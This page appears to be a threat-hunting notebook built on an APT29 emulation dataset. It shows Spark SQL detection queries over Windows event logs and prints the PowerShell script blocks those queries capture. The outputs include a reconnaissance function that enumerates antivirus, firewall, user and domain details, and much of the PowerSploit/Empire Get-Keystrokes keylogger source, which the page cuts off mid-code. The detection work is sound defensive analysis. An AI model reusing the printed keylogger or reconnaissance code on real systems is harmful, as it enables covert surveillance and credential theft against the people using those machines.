    $NameSpace = Get-WmiObject -Namespace &quot;root&quot; -Class &quot;__Namespace&quot; | Select Name | Out-String -Stream | Select-String &quot;SecurityCenter&quot;
    foreach ($SecurityCenter in $NameSpace) { 
        Get-WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List
        WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class FireWallProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List 
    } 

    Gwmi Win32_OperatingSystem | Select Name, OSArchitecture, CSName, BuildNumber, Version | Format-List
    Invoke-NetUserGetGroups
    Invoke-NetUserGetLocalGroups
}

ScriptBlock ID: 70878299-2ee1-4a5d-869f-124b349aee1d
Path: C:\Program Files\SysinternalsSuite\readme.ps1 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:1BA09833-CDF3-44BE-86D0-6F5B1C66D151</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT split(d.NewProcessId, &#39;0x&#39;)[1] as NewProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN(</span>
<span class="sd">    SELECT a.ProcessId, a.NewProcessId</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT NewProcessId</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">          AND EventID = 4688</span>
<span class="sd">          AND LOWER(NewProcessName) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentProcessName) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ProcessId = b.NewProcessId</span>
<span class="sd">    WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">      AND a.EventID = 4688</span>
<span class="sd">      AND a.MandatoryLabel = &quot;S-1-16-12288&quot;</span>
<span class="sd">      AND a.TokenElevationType = &quot;%%1937&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ProcessId = c.NewProcessId</span>
<span class="sd">  WHERE LOWER(d.Channel) = &quot;security&quot;</span>
<span class="sd">    AND d.EventID = 4688</span>
<span class="sd">    AND d.NewProcessName LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON LOWER(hex(f.ExecutionProcessID)) = e.NewProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">  AND f.EventID = 4104</span>
<span class="sd">  AND LOWER(f.ScriptBlockText) LIKE &quot;%$env:computername%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Invoke-Discovery {
    $DiscoveryInfo =@()
    $CurrentDir = Get-Location

    $DiscoveryInfo += [PSCustomObject]@{
                CurrentDirectory = $CurrentDir
                TempDirectory = $env:TEMP
                UserName = $env:USERNAME
                ComputerName = $env:COMPUTERNAME
                UserDomain = $env:USERDOMAIN
                CurrentPID = $PID
            }

    $DiscoveryInfo | Format-List
    
    $NameSpace = Get-WmiObject -Namespace &quot;root&quot; -Class &quot;__Namespace&quot; | Select Name | Out-String -Stream | Select-String &quot;SecurityCenter&quot;
    foreach ($SecurityCenter in $NameSpace) { 
        Get-WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List
        WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class FireWallProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List 
    } 

    Gwmi Win32_OperatingSystem | Select Name, OSArchitecture, CSName, BuildNumber, Version | Format-List
    Invoke-NetUserGetGroups
    Invoke-NetUserGetLocalGroups
}

ScriptBlock ID: 70878299-2ee1-4a5d-869f-124b349aee1d
Path: C:\Program Files\SysinternalsSuite\readme.ps1 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="c-4-system-network-configuration-discovery">
<h2>4.C.4. System Network Configuration Discovery<a class="headerlink" href="#c-4-system-network-configuration-discovery" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Enumerated the current domain name using PowerShell</p>
<p><strong>Criteria:</strong> powershell.exe executing $env:USERDOMAIN</p>
<div class="section" id="id29">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id29" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:1418A09E-BC90-4BC5-A0BC-1ECC4283ACF4</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT d.ProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">    SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT ProcessGuid</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">          AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">    WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND a.EventID = 1</span>
<span class="sd">      AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">  WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND d.EventID = 1</span>
<span class="sd">    AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ExecutionProcessID = e.ProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">  AND f.EventID = 4104</span>
<span class="sd">  AND LOWER(f.ScriptBlockText) LIKE &quot;%$env:userdomain%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Invoke-Discovery {
    $DiscoveryInfo =@()
    $CurrentDir = Get-Location

    $DiscoveryInfo += [PSCustomObject]@{
                CurrentDirectory = $CurrentDir
                TempDirectory = $env:TEMP
                UserName = $env:USERNAME
                ComputerName = $env:COMPUTERNAME
                UserDomain = $env:USERDOMAIN
                CurrentPID = $PID
            }

    $DiscoveryInfo | Format-List
    
    $NameSpace = Get-WmiObject -Namespace &quot;root&quot; -Class &quot;__Namespace&quot; | Select Name | Out-String -Stream | Select-String &quot;SecurityCenter&quot;
    foreach ($SecurityCenter in $NameSpace) { 
        Get-WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List
        WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class FireWallProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List 
    } 

    Gwmi Win32_OperatingSystem | Select Name, OSArchitecture, CSName, BuildNumber, Version | Format-List
    Invoke-NetUserGetGroups
    Invoke-NetUserGetLocalGroups
}

ScriptBlock ID: 70878299-2ee1-4a5d-869f-124b349aee1d
Path: C:\Program Files\SysinternalsSuite\readme.ps1 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:8D215D46-CE33-4CB7-9934-FF9205971570</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT split(d.NewProcessId, &#39;0x&#39;)[1] as NewProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN(</span>
<span class="sd">    SELECT a.ProcessId, a.NewProcessId</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT NewProcessId</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">          AND EventID = 4688</span>
<span class="sd">          AND LOWER(NewProcessName) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentProcessName) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ProcessId = b.NewProcessId</span>
<span class="sd">    WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">      AND a.EventID = 4688</span>
<span class="sd">      AND a.MandatoryLabel = &quot;S-1-16-12288&quot;</span>
<span class="sd">      AND a.TokenElevationType = &quot;%%1937&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ProcessId = c.NewProcessId</span>
<span class="sd">  WHERE LOWER(d.Channel) = &quot;security&quot;</span>
<span class="sd">    AND d.EventID = 4688</span>
<span class="sd">    AND d.NewProcessName LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON LOWER(hex(f.ExecutionProcessID)) = e.NewProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">  AND f.EventID = 4104</span>
<span class="sd">  AND LOWER(f.ScriptBlockText) LIKE &quot;%$env:userdomain%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Invoke-Discovery {
    $DiscoveryInfo =@()
    $CurrentDir = Get-Location

    $DiscoveryInfo += [PSCustomObject]@{
                CurrentDirectory = $CurrentDir
                TempDirectory = $env:TEMP
                UserName = $env:USERNAME
                ComputerName = $env:COMPUTERNAME
                UserDomain = $env:USERDOMAIN
                CurrentPID = $PID
            }

    $DiscoveryInfo | Format-List
    
    $NameSpace = Get-WmiObject -Namespace &quot;root&quot; -Class &quot;__Namespace&quot; | Select Name | Out-String -Stream | Select-String &quot;SecurityCenter&quot;
    foreach ($SecurityCenter in $NameSpace) { 
        Get-WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List
        WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class FireWallProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List 
    } 

    Gwmi Win32_OperatingSystem | Select Name, OSArchitecture, CSName, BuildNumber, Version | Format-List
    Invoke-NetUserGetGroups
    Invoke-NetUserGetLocalGroups
}

ScriptBlock ID: 70878299-2ee1-4a5d-869f-124b349aee1d
Path: C:\Program Files\SysinternalsSuite\readme.ps1 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="c-5-process-discovery">
<h2>4.C.5. Process Discovery<a class="headerlink" href="#c-5-process-discovery" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Enumerated the current process ID using PowerShell</p>
<p><strong>Criteria:</strong> powershell.exe executing $PID</p>
<div class="section" id="id30">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id30" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:2DBE08DB-BADD-40AD-A037-DEBD29E207C6</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT d.ProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">    SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT ProcessGuid</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">          AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">    WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND a.EventID = 1</span>
<span class="sd">      AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">  WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND d.EventID = 1</span>
<span class="sd">    AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ExecutionProcessID = e.ProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">  AND f.EventID = 4104</span>
<span class="sd">  AND LOWER(f.ScriptBlockText) LIKE &quot;%$pid%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Get-Keystrokes {
&lt;#
.SYNOPSIS
 
    Logs keys pressed, time and the active window (when changed).
    Some modifications for Empire by @harmj0y.
    
    PowerSploit Function: Get-Keystrokes
    Author: Chris Campbell (@obscuresec) and Matthew Graeber (@mattifestation)
    Modifications: @harmj0y
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    
.LINK
    http://www.obscuresec.com/
    http://www.exploit-monday.com/
#&gt;
    Start-Job -Name &quot;Keystrokes&quot; -ScriptBlock {
        Write-Host &quot;`nJobPID`n------`n$PID&quot;
        [Reflection.Assembly]::LoadWithPartialName(&#39;System.Windows.Forms&#39;) | Out-Null

        try
        {
            $ImportDll = [User32]
        }
        catch
        {
            $DynAssembly = New-Object System.Reflection.AssemblyName(&#39;Win32Lib&#39;)
            $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
            $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule(&#39;Win32Lib&#39;, $False)
            $TypeBuilder = $ModuleBuilder.DefineType(&#39;User32&#39;, &#39;Public, Class&#39;)

            $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
            $FieldArray = [Reflection.FieldInfo[]] @(
                [Runtime.InteropServices.DllImportAttribute].GetField(&#39;EntryPoint&#39;),
                [Runtime.InteropServices.DllImportAttribute].GetField(&#39;ExactSpelling&#39;),
                [Runtime.InteropServices.DllImportAttribute].GetField(&#39;SetLastError&#39;),
                [Runtime.InteropServices.DllImportAttribute].GetField(&#39;PreserveSig&#39;),
                [Runtime.InteropServices.DllImportAttribute].GetField(&#39;CallingConvention&#39;),
                [Runtime.InteropServices.DllImportAttribute].GetField(&#39;CharSet&#39;)
            )

            $PInvokeMethod = $TypeBuilder.DefineMethod(&#39;GetAsyncKeyState&#39;, &#39;Public, Static&#39;, [Int16], [Type[]] @([Windows.Forms.Keys]))
            $FieldValueArray = [Object[]] @(
                &#39;GetAsyncKeyState&#39;,
                $True,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @(&#39;user32.dll&#39;), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $PInvokeMethod = $TypeBuilder.DefineMethod(&#39;GetKeyboardState&#39;, &#39;Public, Static&#39;, [Int32], [Type[]] @([Byte[]]))
            $FieldValueArray = [Object[]] @(
                &#39;GetKeyboardState&#39;,
                $True,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @(&#39;user32.dll&#39;), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $PInvokeMethod = $TypeBuilder.DefineMethod(&#39;MapVirtualKey&#39;, &#39;Public, Static&#39;, [Int32], [Type[]] @([Int32], [Int32]))
            $FieldValueArray = [Object[]] @(
                &#39;MapVirtualKey&#39;,
                $False,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @(&#39;user32.dll&#39;), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $PInvokeMethod = $TypeBuilder.DefineMethod(&#39;ToUnicode&#39;, &#39;Public, Static&#39;, [Int32],
                [Type[]] @([UInt32], [UInt32], [Byte[]], [Text.StringBuilder], [Int32], [UInt32]))
            $FieldValueArray = [Object[]] @(
                &#39;ToUnicode&#39;,
                $False,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @(&#39;user32.dll&#39;), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $PInvokeMethod = $TypeBuilder.DefineMethod(&#39;GetForegroundWindow&#39;, &#39;Public, Static&#39;, [IntPtr], [Type[]] @())
            $FieldValueArray = [Object[]] @(
                &#39;GetForegroundWindow&#39;,
                $True,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @(&#39;user32.dll&#39;), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $ImportDll = $TypeBuilder.CreateType()
        }

        $LastWindowTitle = &quot;&quot;
        $i=0
        while ($true) {
            Start-Sleep -Milliseconds 40
            $gotit = &quot;&quot;
            $Outout = &quot;&quot;
            
            for ($char = 1; $char -le 254; $char++) {
                $vkey = $char
                $gotit = $ImportDll::GetAsyncKeyState($vkey)
                
                if ($gotit -eq -32767) {

                    #check for keys not mapped by virtual keyboard
                    $LeftShift    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LShiftKey) -band 0x8000) -eq 0x8000
                    $RightShift   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RShiftKey) -band 0x8000) -eq 0x8000
                    $LeftCtrl     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LControlKey) -band 0x8000) -eq 0x8000
                    $RightCtrl    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RControlKey) -band 0x8000) -eq 0x8000
                    $LeftAlt      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LMenu) -band 0x8000) -eq 0x8000
                    $RightAlt     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RMenu) -band 0x8000) -eq 0x8000
                    $TabKey       = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Tab) -band 0x8000) -eq 0x8000
                    $SpaceBar     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Space) -band 0x8000) -eq 0x8000
                    $DeleteKey    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Delete) -band 0x8000) -eq 0x8000
                    $EnterKey     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Return) -band 0x8000) -eq 0x8000
                    $BackSpaceKey = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Back) -band 0x8000) -eq 0x8000
                    $LeftArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Left) -band 0x8000) -eq 0x8000
                    $RightArrow   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Right) -band 0x8000) -eq 0x8000
                    $UpArrow      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Up) -band 0x8000) -eq 0x8000
                    $DownArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Down) -band 0x8000) -eq 0x8000
                    $LeftMouse    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LButton) -band 0x8000) -eq 0x8000
                    $RightMouse   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000

                    if ($LeftShift -or $RightShift) {$Outout += &#39;[Shift]&#39;}
                    if ($LeftCtrl  -or $RightCtrl)  {$Outout += &#39;[Ctrl]&#39;}
                    if ($LeftAlt   -or $RightAlt)   {$Outout += &#39;[Alt]&#39;}
                    if ($TabKey)       {$Outout += &#39;[Tab]&#39;}
                    if ($SpaceBar)     {$Outout += &#39;[SpaceBar]&#39;}
                    if ($DeleteKey)    {$Outout += &#39;[Delete]&#39;}
                    if ($EnterKey)     {$Outout += &#39;[Enter]&#39;}
                    if ($BackSpaceKey) {$Outout += &#39;[Backspace]&#39;}
                    if ($LeftArrow)    {$Outout += &#39;[Left Arrow]&#39;}
                    if ($RightArrow)   {$Outout += &#39;[Right Arrow]&#39;}
                    if ($UpArrow)      {$Outout += &#39;[Up Arrow]&#39;}
                    if ($DownArrow)    {$Outout += &#39;[Down Arrow]&#39;}
